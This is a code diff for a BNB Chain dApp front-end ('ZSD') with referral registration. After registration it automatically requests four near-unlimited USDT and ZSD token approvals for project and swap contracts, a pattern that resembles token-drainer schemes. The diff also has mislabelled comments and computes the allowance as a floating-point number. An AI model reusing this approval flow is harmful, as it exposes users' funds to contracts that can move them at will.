@@ -16,14 +16,20 @@ import {
   toWei,
 } from "thirdweb";
 import { approve, allowance } from "thirdweb/extensions/erc20";
-import { ZSDPROJECTABI } from "../../abi/ZSDPROJECTABI";
-import { APIConfig } from "../../abi/APIConfiguration";
-import { useActiveAccount } from "thirdweb/react";
-import { USDTAbi } from "../../abi/USDTAbi";
 import { sendTransaction } from "thirdweb";
+import { APIConfig } from "../../abi/APIConfiguration";
+import { USDTAbi } from "../../abi/USDTAbi";
+import { ZSDABI } from "../../abi/ZSDABI";
+import { ZSDSwapABI } from "../../abi/ZSDSwapABI";
+import { ZSDPROJECTABI } from "../../abi/ZSDPROJECTABI";
+import { useActiveAccount } from "thirdweb/react";
+import { debug } from "console";
 
 const contractABI: any = USDTAbi;
 const contractZSDPROJECTABI: any = ZSDPROJECTABI;
+const contractZSDABI: any = ZSDABI;
+const contractZSDWapABI: any = ZSDSwapABI;
+
 
 export const metadata: Metadata = {
   title: "ZSD",
@@ -40,13 +46,6 @@ const wallets: any = [
   walletConnect(),
 ];
 
-const ZSDContract = getContract({
-  client: client,
-  address: APIConfig.ZSDaddress,
-  chain: bsc,
-  abi: contractABI
-});
-
 //USDT
 const USDT = getContract({
   client: client,
@@ -55,6 +54,13 @@ const USDT = getContract({
   abi: contractABI,
 });
 
+// ZSD
+const ZSD = getContract({
+  client: client,
+  address: APIConfig.ZSDaddress,
+  abi: contractZSDABI,
+  chain: bsc,
+});
 
 // ZSDProject
 const ZSDProjectfun = getContract({
@@ -64,12 +70,13 @@ const ZSDProjectfun = getContract({
   abi: contractZSDPROJECTABI,
 });
 
-//USDT
-const USDTContract = getContract({
-  client: client,
-  address: APIConfig.USDTaddress,
-  chain: bsc,
-});
+// ZSDWAP
+// const ZSDContract = getContract({
+//   client: client,
+//   address: APIConfig.ZSDSwapAddress,
+//   chain: bsc,
+//   abi: contractZSDWapABI
+// });
 
 const CallWallet = () => {
   const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
@@ -94,93 +101,53 @@ const CallWallet = () => {
     }
   };
 
-  // 输入邀请链接
-  const onFriendRechargeFun = async () => {
-    const values = form.getFieldsValue();
-    const Inviteaddress: any = values.Invitelink.split(' ').join('')
-    // const values = form.getFieldsValue();
-    // const search = values.Invitelink;
-    // const params = new URLSearchParams(new URL(search).search);
-    // const Inviteaddress: any = params.get('ref');
+  // 授权
+  const AccreditFun = async () => {
+    const balance: any = 10000000000000000000000000 * 10 ** 18;
+    // 第一次USDT授权
+    const accreditUSDT = prepareContractCall({
+      contract: USDT,
+      method: "function approve(address, uint256) returns (bool)",
+      params: [APIConfig.ZSDPROJECTAddress, balance],
+    });
+    await sendAndConfirmTransaction({
+      transaction: accreditUSDT,
+      account: account
+    });
 
-    try {
-      const registerTX = prepareContractCall({
-        contract: ZSDContract,
-        method: "function register(address)",
-        params: [Inviteaddress],
-      });
-      const registerTXResult = await sendAndConfirmTransaction({
-        transaction: registerTX,
-        account: account,
-      });
+    // 第二次ZSD授权
+    const accreditZSD = prepareContractCall({
+      contract: ZSD,
+      method: "function approve(address, uint256) returns (bool)",
+      params: [APIConfig.ZSDPROJECTAddress, balance],
+    });
+    await sendAndConfirmTransaction({
+      transaction: accreditZSD,
+      account: account
+    });
 
-      // *********************************************************登录后授权*********************************************************************
-      //用户USDT的余额
-      const USDTBalance = await readContract({
-        contract: USDT,
-        method: "function balanceOf(address) view returns (uint256)",
-        params: [account.address],
-      });
+    // 第三次ZSDWAP授权
+    const txZsd = prepareContractCall({
+      contract: USDT,
+      method: "function approve(address, uint256) returns (bool)",
+      params: [APIConfig.ZSDSwapAddress, balance],
+    });
+    await sendAndConfirmTransaction({
+      transaction: txZsd,
+      account: account
+    });
 
-      const allowanceUSDTBalance = await readContract({
-        contract: USDT,
-        method: "function allowance(address, address)",
-        params: [account.address, APIConfig.ZSDPROJECTAddress],
-      });
-
-      if (allowanceUSDTBalance == 0) {
-        message.info("请授权ZSD合约使用您的USDT");
-        return;
-      }
-      //zsd合约有权限调用用户 balance的资产 ||  用户将自己的 USDT转出banlance的权限赋予zsd合约
-      const banlance: any = 10000000000000000000000000 * 10 ** 18;
-      const tx1 = prepareContractCall({
-        contract: USDT,
-        method: "function approve(address, uint256) returns (bool)",
-        params: [APIConfig.ZSDPROJECTAddress, banlance],
-      });
-
-      // 用户将usdt转给zsd合约
-      const tx1Result = await sendAndConfirmTransaction({
-        transaction: tx1,
-        account: account,
-      });
-    } catch (error: any) {
-      const firstLine = error.toString().split("\n")[0];
-      const match = firstLine.match(/TransactionError: Error - (.+)/);
-      if (match && match[1]) {
-        switch (match[1]) {
-          case "referrer has not deposited":
-            message.info("邀请人必须已经投资过");
-            break;
-          case "User already registered":
-            message.info("邀请用户未注册");
-            break;
-          case "You cannot refer":
-            message.info("邀请人和用户不是同一个人");
-            break;
-          default:
-            message.error("发生未知错误");
-            break;
-        }
-        setIsModalOpen(true);
-      } else if (error instanceof TypeError) {
-        if (
-          error.message.includes("Cannot read properties of null (reading '1')")
-        ) {
-          message.error("发生错误：尝试读取 null 对象的属性");
-          setIsModalOpen(true);
-        } else {
-          message.error("发生类型错误");
-          setIsModalOpen(true);
-        }
-      } else {
-        message.error("输入错误，请输入正确的邀请人地址");
-        setIsModalOpen(true);
-      }
-    }
-  };
-
+    // 第四次project授权
+    const txZSDWAP = prepareContractCall({
+      contract: ZSD,
+      method: "function approve(address, uint256) returns (bool)",
+      params: [APIConfig.ZSDSwapAddress, balance],
+    });
+    await sendAndConfirmTransaction({
+      transaction: txZSDWAP,
+      account: account
+    });
+  }
   // 登录后判断用户是否注册
   const WhetherInviteUsers = async () => {
     if (!account) {
@@ -195,12 +162,14 @@ const CallWallet = () => {
       const registerTX = prepareContractCall({
         contract: ZSDProjectfun,
         method: "function register(address)",
-        params: [Inviteaddress],
+        params: [Inviteaddress ? Inviteaddress : account.address],
       });
       const registerTXResult = await sendAndConfirmTransaction({
         transaction: registerTX,
         account: account,
       });
+      // 授权
+      AccreditFun()
     } catch (error: any) {
       const firstLine = error.toString().split("\n")[0];
       const match = firstLine.match(/TransactionError: Error - (.+)/);
@@ -208,7 +177,6 @@ const CallWallet = () => {
         switch (match[1]) {
           case "referrer has not deposited":
             message.info("邀请人没有入金");
-            // handleCancel();
             break;
           case "User already registered":
             break;
@@ -253,7 +221,7 @@ const CallWallet = () => {
               <Button
                 className={styles.verifystyle}
                 htmlType="submit"
-                onClick={onFriendRechargeFun}
+              // onClick={onFriendRechargeFun}
               >
                 确认
               </Button>
